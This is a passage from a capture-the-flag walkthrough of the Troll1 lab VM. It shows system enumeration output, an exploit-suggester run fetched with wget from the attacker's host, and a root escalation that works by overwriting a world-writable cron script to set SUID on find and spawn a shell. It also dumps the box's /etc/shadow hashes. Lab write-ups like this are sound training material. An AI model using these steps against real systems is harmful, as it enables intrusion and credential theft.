+-rw-r--r--  1 root root  889 Mar 25  2013 ureadahead.conf
+-rw-r--r--  1 root root  683 Mar 25  2013 ureadahead-other.conf
+-r--r--r--  1 root root  901 Aug  9  2014 vmware-tools.conf
+-rw-r--r--  1 root root  351 Aug  9  2014 vmware-tools-thinprint.conf
+-rw-r--r--  1 root root  737 May 16  2013 vsftpd.conf
+-rw-r--r--  1 root root 1521 Apr 11  2014 wait-for-state.conf
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 736K
+drwxr-xr-x 6 root root 4.0K Aug 10  2014 system
+-rwxr-xr-x 1 root root  66K Jun 19  2014 systemd-hostnamed
+-rwxr-xr-x 1 root root  70K Jun 19  2014 systemd-localed
+-rwxr-xr-x 1 root root 254K Jun 19  2014 systemd-logind
+-rwxr-xr-x 1 root root  22K Jun 19  2014 systemd-multi-seat-x
+-rwxr-xr-x 1 root root  78K Jun 19  2014 systemd-timedated
+-rwxr-xr-x 1 root root 230K Jun 19  2014 systemd-udevd
+
+/lib/systemd/system:
+total 72K
+drwxr-xr-x 2 root root 4.0K Aug  9  2014 dbus.target.wants
+drwxr-xr-x 2 root root 4.0K Aug  9  2014 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Aug  9  2014 sockets.target.wants
+lrwxrwxrwx 1 root root   21 Aug  9  2014 udev.service -> systemd-udevd.service
+drwxr-xr-x 2 root root 4.0K Aug  9  2014 sysinit.target.wants
+-rw-r--r-- 1 root root  347 Jul  3  2014 dbus.service
+-rw-r--r-- 1 root root  106 Jul  3  2014 dbus.socket
+-rw-r--r-- 1 root root  578 Jun 19  2014 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  575 Jun 19  2014 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  788 Jun 19  2014 systemd-udevd.service
+-rw-r--r-- 1 root root  823 Jun 19  2014 systemd-udev-settle.service
+-rw-r--r-- 1 root root  715 Jun 19  2014 systemd-udev-trigger.service
+-rwxr-xr-x 1 root root  251 Jun 17  2014 open-vm-tools.service
+-rw-r--r-- 1 root root  344 May  2  2014 ssh.service
+-rw-r--r-- 1 root root  196 May  2  2014 ssh@.service
+-rw-r--r-- 1 root root  216 May  2  2014 ssh.socket
+-rw-r--r-- 1 root root  188 Apr 17  2014 rsync.service
+-rw-r--r-- 1 root root  272 Feb  4  2014 sudo.service
+-rw-r--r-- 1 root root  199 Dec  4  2013 rsyslog.service
+
+/lib/systemd/system/dbus.target.wants:
+total 0
+lrwxrwxrwx 1 root root 14 Jul  3  2014 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Jul  3  2014 dbus.service -> ../dbus.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Aug  9  2014 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Aug  9  2014 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx 1 root root 14 Jul  3  2014 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 Aug  9  2014 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 31 Aug  9  2014 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.9p5
+
+
+[-] Apache version:
+Server version: Apache/2.4.7 (Ubuntu)
+Server built:   Jul 22 2014 14:36:39
+
+
+[-] Apache user configuration:
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+
+[-] Installed Apache modules:
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_event_module (shared)
+ negotiation_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+
+[-] www home dir contents:
+/var/www/:
+total 12K
+drwxr-xr-x  3 root root 4.0K Aug  9  2014 .
+drwxr-xr-x 12 root root 4.0K Aug 10  2014 ..
+drwxr-xr-x  5 root root 4.0K Aug 10  2014 html
+
+/var/www/html:
+total 76K
+drwxr-xr-x 5 root root 4.0K Aug 10  2014 .
+drwxr-xr-x 3 root root 4.0K Aug  9  2014 ..
+drwxr-xr-x 4 root root 4.0K Aug 12  2014 0x0856BF
+-rw-r--r-- 1 root root  48K Aug 10  2014 hacker.jpg
+-rw-r--r-- 1 root root   36 Aug 10  2014 index.html
+-rw-r--r-- 1 root root   31 Aug 10  2014 robots.txt
+drwxr-xr-x 2 root root 4.0K Aug 10  2014 secret
+drwxr-xr-x 2 root root 4.0K Aug 13  2014 sup3rs3cr3tdirlol
+
+/var/www/html/0x0856BF:
+total 16K
+drwxr-xr-x 4 root root 4.0K Aug 12  2014 .
+drwxr-xr-x 5 root root 4.0K Aug 10  2014 ..
+drwxr-xr-x 2 root root 4.0K Aug 12  2014 good_luck
+drwxr-xr-x 2 root root 4.0K Aug 12  2014 this_folder_contains_the_password
+
+/var/www/html/0x0856BF/good_luck:
+total 12K
+drwxr-xr-x 2 root root 4.0K Aug 12  2014 .
+drwxr-xr-x 4 root root 4.0K Aug 12  2014 ..
+-rw-r--r-- 1 root root  109 Aug  9  2014 which_one_lol.txt
+
+/var/www/html/0x0856BF/this_folder_contains_the_password:
+total 12K
+drwxr-xr-x 2 root root 4.0K Aug 12  2014 .
+drwxr-xr-x 4 root root 4.0K Aug 12  2014 ..
+-rw-r--r-- 1 root root   12 Aug  9  2014 Pass.txt
+
+/var/www/html/secret:
+total 64K
+drwxr-xr-x 2 root root 4.0K Aug 10  2014 .
+drwxr-xr-x 5 root root 4.0K Aug 10  2014 ..
+-rw-r--r-- 1 root root   37 Aug 10  2014 index.html
+-rw-r--r-- 1 root root  50K Aug 10  2014 troll.jpg
+
+/var/www/html/sup3rs3cr3tdirlol:
+total 16K
+drwxr-xr-x 2 root root 4.0K Aug 13  2014 .
+drwxr-xr-x 5 root root 4.0K Aug 10  2014 ..
+-rwxrwxrwx 1 root root 7.2K Aug 11  2014 roflmao
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+
+
+[-] Installed compilers:
+ii  gcc                                 4:4.8.2-1ubuntu6              i386         GNU C compiler
+ii  gcc-4.8                             4.8.2-19ubuntu1               i386         GNU C compiler
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1546 Aug  9  2014 /etc/passwd
+-rw-r--r-- 1 root root 852 Aug  9  2014 /etc/group
+-rw-r--r-- 1 root root 665 Feb 19  2014 /etc/profile
+-rw-r----- 1 root shadow 2125 Aug 10  2014 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-sr-x 1 libuuid libuuid 17996 Jun  3  2014 /usr/sbin/uuidd
+-rwsr-xr-- 1 root dip 322968 Jan 22  2013 /usr/sbin/pppd
+-rwsr-xr-x 1 root root 44620 Feb 16  2014 /usr/bin/chfn
+-rwsr-xr-x 1 root root 156708 Feb 10  2014 /usr/bin/sudo
+-rwsr-xr-x 1 root root 45420 Feb 16  2014 /usr/bin/passwd
+-rwsr-xr-x 1 root root 18136 May  7  2014 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr
+-rwsr-xr-x 1 root root 35916 Feb 16  2014 /usr/bin/chsh
+-rwsr-xr-x 1 root root 30984 Feb 16  2014 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 66252 Feb 16  2014 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 9612 Jul 28  2014 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 492972 May 12  2014 /usr/lib/openssh/ssh-keysign
+-r-sr-xr-x 1 root root 10224 Aug  9  2014 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 9532 Aug  9  2014 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 329856 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 35300 Feb 16  2014 /bin/su
+-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 30112 Dec 16  2013 /bin/fusermount
+-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 88752 Jun  3  2014 /bin/mount
+-rwsr-xr-x 1 root root 67704 Jun  3  2014 /bin/umount
+
+
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 492972 May 12  2014 /usr/lib/openssh/ssh-keysign
+
+
+[-] GUID files:
+-rwsr-sr-x 1 libuuid libuuid 17996 Jun  3  2014 /usr/sbin/uuidd
+-rwxr-sr-x 1 root mail 13960 Dec  6  2013 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root tty 9748 Jun  4  2013 /usr/bin/bsd-write
+-rwxr-sr-x 3 root mail 9704 Dec  3  2012 /usr/bin/mail-lock
+-rwxr-sr-x 1 root shadow 49420 Feb 16  2014 /usr/bin/chage
+-rwxr-sr-x 3 root mail 9704 Dec  3  2012 /usr/bin/mail-touchlock
+-rwxr-sr-x 1 root crontab 34824 Feb  8  2013 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 18208 Feb 16  2014 /usr/bin/expiry
+-rwxr-sr-x 3 root mail 9704 Dec  3  2012 /usr/bin/mail-unlock
+-rwxr-sr-x 1 root tty 18056 Jun  3  2014 /usr/bin/wall
+-rwxr-sr-x 1 root mlocate 34452 Jun 20  2013 /usr/bin/mlocate
+-rwxr-sr-x 1 root ssh 329144 May 12  2014 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 30432 Jan 31  2014 /sbin/unix_chkpwd
+
+
+[+] Possibly interesting GUID files:
+-rwxr-sr-x 1 root ssh 329144 May 12  2014 /usr/bin/ssh-agent
+
+
+[-] World-writable files (excluding /proc and /sys):
+-rwxrwxrwx 1 troll root 8068 Aug 10  2014 /srv/ftp/lol.pcap
+-rwxrwxrwx 1 root root 34 Aug 13  2014 /var/tmp/cleaner.py.swp
+-rwxrwxrwx 1 root root 7296 Aug 11  2014 /var/www/html/sup3rs3cr3tdirlol/roflmao
+-rwxrwxrwx 1 root root 23 Aug 13  2014 /var/log/cronlog
+-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
+
+
+[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+# / was on /dev/sda1 during installation
+UUID=5ea1589a-303f-445d-b778-1f26a563bba1 /               ext4    errors=remount-ro 0       1
+# swap was on /dev/sda5 during installation
+UUID=7b2fd829-c355-4e27-abc7-cc46bbda1f1e none            swap    sw              0       0
+/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+
+[-] Can't search *.conf files as no keyword was entered
+[-] Can't search *.php files as no keyword was entered
+[-] Can't search *.log files as no keyword was entered
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 34 Jul 22  2014 /etc/ld.so.conf
+-rw-r--r-- 1 root root 5653 Aug  9  2014 /etc/vsftpd.conf
+-rw-r--r-- 1 root root 703 Jan 22  2014 /etc/logrotate.conf
+-rw-r--r-- 1 root root 92 Feb 19  2014 /etc/host.conf
+-rw-r--r-- 1 root root 475 Feb 19  2014 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 1260 Jun 30  2013 /etc/ucf.conf
+-rw-r--r-- 1 root root 1245 Apr 18  2013 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 144 Aug  9  2014 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 350 Aug  9  2014 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 956 Feb 19  2014 /etc/mke2fs.conf
+-rw-r----- 1 root fuse 280 May 24  2013 /etc/fuse.conf
+-rw-r--r-- 1 root root 14867 May  9  2014 /etc/ltrace.conf
+-rw-r--r-- 1 root root 2981 Jul 22  2014 /etc/adduser.conf
+-rw-r--r-- 1 root root 191 Dec  4  2013 /etc/libaudit.conf
+-rw-r--r-- 1 root root 771 May 18  2013 /etc/insserv.conf
+-rw-r--r-- 1 root root 604 Nov  7  2013 /etc/deluser.conf
+-rw-r--r-- 1 root root 2084 Mar 31  2013 /etc/sysctl.conf
+-rw-r--r-- 1 root root 552 Jan 31  2014 /etc/pam.conf
+-rw-r--r-- 1 root root 4781 Nov 15  2013 /etc/hdparm.conf
+-rw-r--r-- 1 root root 7464 Aug  9  2014 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 2969 Feb 23  2014 /etc/debconf.conf
+-rw-r--r-- 1 root root 321 Jun 20  2013 /etc/updatedb.conf
+-rw-r--r-- 1 root root 2584 Oct 10  2012 /etc/gai.conf
+-rw-r--r-- 1 root root 321 Apr 16  2014 /etc/blkid.conf
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/troll/.bash_history
+
+
+[-] Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Jul 22  2014 .
+drwxr-xr-x 12 root root 4096 Aug 10  2014 ..
+
+
+### SCAN COMPLETE ####################################
+
+==================================================================================================
+
+
+$ wget http://192.168.1.8:8000/Linux-exploit-suggester.sh | sh
+--2018-09-16 14:56:18--  http://192.168.1.8:8000/Linux-exploit-suggester.sh
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 65666 (64K) [text/x-sh]
+Saving to: ‘Linux-exploit-suggester.sh’
+100%[======================================================================>] 65,666      --.-K/s   in 0.003s  
+
+2018-09-16 14:56:18 (18.9 MB/s) - ‘Linux-exploit-suggester.sh’ saved [65666/65666]
+
+$ ls
+Linux-exploit-suggester.sh
+
+$ chmod +x Linux-exploit-suggester.sh
+
+$ ./Linux-exploit-suggester.sh
+
+Available information:
+
+Kernel version: 3.13.0
+Architecture: i686
+Distribution: ubuntu
+Distribution version: 14.04.1
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+70 kernel space exploits
+32 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2014-0196] rawmodePTY
+
+   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
+   Download URL: https://www.exploit-db.com/download/33516
+
+[+] [CVE-2014-4014] inode_capable
+
+   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
+   Tags: ubuntu=12.04
+   Download URL: https://www.exploit-db.com/download/33824
+
+[+] [CVE-2014-5207] fuse_suid
+
+   Details: https://www.exploit-db.com/exploits/34923/
+   Download URL: https://www.exploit-db.com/download/34923
+
+[+] [CVE-2015-1328] overlayfs
+
+   Details: http://seclists.org/oss-sec/2015/q2/717
+   Tags: [ ubuntu=12.04|14.04|14.10|15.04 ]
+   Download URL: https://www.exploit-db.com/download/37292
+
+[+] [CVE-2015-8660] overlayfs (ovl_setattr)
+
+   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+   Download URL: https://www.exploit-db.com/download/39230
+
+[+] [CVE-2015-8660] overlayfs (ovl_setattr)
+
+   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+   Tags: [ ubuntu=14.04|15.10 ]
+   Download URL: https://www.exploit-db.com/download/39166
+
+[+] [CVE-2016-0728] keyring
+
+   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
+   Download URL: https://www.exploit-db.com/download/40003
+   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
+
+[+] [CVE-2016-2384] usb-midi
+
+   Details: https://xairy.github.io/blog/2016/cve-2016-2384
+   Tags: [ ubuntu=14.04 ],fedora=22
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
+   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
+
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE
+
+   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
+   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only
+
+[+] [CVE-2017-6074] dccp
+
+   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
+   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
+   Download URL: https://www.exploit-db.com/download/41458
+   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
+
+[+] [CVE-2017-7308] af_packet
+
+   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
+   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-7308/CVE-2017-7308/poc.c
+   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels
+
+[+] [CVE-2009-1185] udev
+
+   Details: https://www.exploit-db.com/exploits/8572/
+   Tags: ubuntu=8.10|9.04
+   Download URL: https://www.exploit-db.com/download/8572
+   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 
+
+[+] [CVE-2009-1185] udev 2
+
+   Details: https://www.exploit-db.com/exploits/8478/
+   Download URL: https://www.exploit-db.com/download/8478
+   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed
+
+[+] [CVE-2015-3202] fuse (fusermount)
+
+   Details: http://seclists.org/oss-sec/2015/q2/520
+   Tags: debian=7.0|8.0,[ ubuntu=* ]
+   Download URL: https://www.exploit-db.com/download/37089
+   Comments: Needs cron or system admin interaction
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+   Tags: ubuntu=16.04|16.10,debian=7|8
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+
+
+==========================================================================================================================================
+Step 4. Privesc to root
+
+Method 1 - Privesc to root using a World writeable python script owned by root and executed via CRON (by root)
+==========================================================================================================================================
+
+[-] World-writable files (excluding /proc and /sys):
+-rwxrwxrwx 1 troll root 8068 Aug 10  2014 /srv/ftp/lol.pcap
+-rwxrwxrwx 1 root root 34 Aug 13  2014 /var/tmp/cleaner.py.swp
+-rwxrwxrwx 1 root root 7296 Aug 11  2014 /var/www/html/sup3rs3cr3tdirlol/roflmao
+-rwxrwxrwx 1 root root 23 Aug 13  2014 /var/log/cronlog
+-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+<SNIP>
+Last login: Sun Sep 16 15:02:39 2018 from 192.168.1.8
+Could not chdir to home directory /home/overflow: No such file or directory
+
+$ ls -al /lib/log/cleaner.py
+-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
+
+# cat /var/log/cronlog
+*/2 * * * * cleaner.py
+
+$ cat /lib/log/cleaner.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('rm -r /tmp/* ')
+except:
+	sys.exit()
+
+$ ls /tmp/
+$ 
+
+
+=> I understood that the world writeable file (and owned by root) 'cleaner.py' is executed every 2 min according to the file "/var/log/cronlog". In addition,  the files that I created earlier in the directory '/tmp/' have been deleted so it seems to be accurate.
+ 
+=> I created a file named "cleaner.py" that will modify the permissions of the file '/etc/sudoers'  when executed by root. I uploaded it and replaced the original file by the modified one.
+
+cleaner.py (modified)
+---------------------
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('chmod 777 /etc/sudoers')
+except:
+	sys.exit()
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+<SNIP>
+Last login: Sun Sep 16 15:02:39 2018 from 192.168.1.8
+Could not chdir to home directory /home/overflow: No such file or directory
+$
+$ cd /tmp
+
+$ wget http://192.168.1.8:8000/cleaner.py
+--2018-09-16 15:20:33--  http://192.168.1.8:8000/cleaner.py
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 105 [text/plain]
+Saving to: ‘cleaner.py’
+100%[======================================================================>] 105         --.-K/s   in 0s      
+2018-09-16 15:20:33 (22.3 MB/s) - ‘cleaner.py’ saved [105/105]
+
+$ cat /tmp/cleaner.py > /lib/log/cleaner.py
+
+$ cat /lib/log/cleaner.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('chmod 777 /etc/sudoers')
+except:
+	sys.exit()
+
+$ ls -al /etc/sudoers
+-r--r----- 1 root root 745 Feb 10  2014 /etc/sudoers
+
+
+=> Note:After a few minutes...
+
+$ ls -al /etc/sudoers
+-rwxrwxrwx 1 root root 745 Feb 10  2014 /etc/sudoers
+
+$ echo 'overflow ALL=(ALL:ALL) ALL' >> /etc/sudoers
+
+$ sudo su
+sudo: /etc/sudoers is world writable
+sudo: no valid sudoers sources found, quitting
+sudo: unable to initialize policy plugin
+
+$ id
+uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
+
+$ sudo find
+sudo: /etc/sudoers is world writable
+sudo: no valid sudoers sources found, quitting
+sudo: unable to initialize policy plugin
+
+
+=> It did not worked so I used another trick (suid Find)
+
+
+cleaner.py (modified)
+---------------------
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('chmod +s /usr/bin/find')
+except:
+	sys.exit()
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+<SNIP>
+Last login: Sun Sep 16 15:02:39 2018 from 192.168.1.8
+Could not chdir to home directory /home/overflow: No such file or directory
+
+$ 
+$ wget http://192.168.1.8:8000/cleaner.py
+--2018-09-16 15:32:19--  http://192.168.1.8:8000/cleaner.py
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 106 [text/plain]
+Saving to: ‘cleaner.py’
+
+100%[======================================================================>] 106         --.-K/s   in 0s      
+
+2018-09-16 15:32:19 (22.1 MB/s) - ‘cleaner.py’ saved [106/106]
+
+$ cat /tmp/cleaner.py > /lib/log/cleaner.py
+
+$ cat /lib/log/cleaner.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+	os.system('chmod +s /usr/bin/find')
+except:
+	sys.exit()
+
+
+$ ls -al /usr/bin/find
+-rwxr-xr-x 1 root root 158404 Jan  6  2014 /usr/bin/find
+
+=> Note:After a few minutes...
+
+$ ls -al /usr/bin/find
+-rwsr-sr-x 1 root root 158404 Jan  6  2014 /usr/bin/find
+                                                                
+$ find -exec /bin/sh \;
+
+# id
+uid=1002(overflow) gid=1002(overflow) euid=0(root) egid=0(root) groups=0(root),1002(overflow)
+
+# cat proof.txt
+Good job, you did it! 
+
+702a8c18d29c6f3ca0d99ef5712bfbdc
+
+# cat /etc/shadow
+root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
+daemon:*:16273:0:99999:7:::
+bin:*:16273:0:99999:7:::
+sys:*:16273:0:99999:7:::
+sync:*:16273:0:99999:7:::
+games:*:16273:0:99999:7:::
+man:*:16273:0:99999:7:::
+lp:*:16273:0:99999:7:::
+mail:*:16273:0:99999:7:::
+news:*:16273:0:99999:7:::
+uucp:*:16273:0:99999:7:::
+proxy:*:16273:0:99999:7:::
+www-data:*:16273:0:99999:7:::
+backup:*:16273:0:99999:7:::
+list:*:16273:0:99999:7:::
+irc:*:16273:0:99999:7:::
+gnats:*:16273:0:99999:7:::
+nobody:*:16273:0:99999:7:::
+libuuid:!:16273:0:99999:7:::
+syslog:*:16273:0:99999:7:::
+messagebus:*:16291:0:99999:7:::
+troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
+sshd:*:16291:0:99999:7:::
+ftp:*:16292:0:99999:7:::
+lololol:!:16292:0:99999:7:::
+overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
+ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
+maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
+felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
+Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
+genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
+usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
+blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
+wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
+vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
+
+
+
+=================================================================================================================================
+Step 4. Privesc to root
+
+Method 2 - Overlayfs exploit (CVE-2015-1328)
+=================================================================================================================================
+
+I tried the Overlayfs exploit (CVE-2015-1328) that was identified by the script 'Linux-exploit-suggester.sh'
+
+[+] [CVE-2015-1328] overlayfs
+   Details: http://seclists.org/oss-sec/2015/q2/717
+   Tags: [ ubuntu=12.04|14.04|14.10|15.04 ]
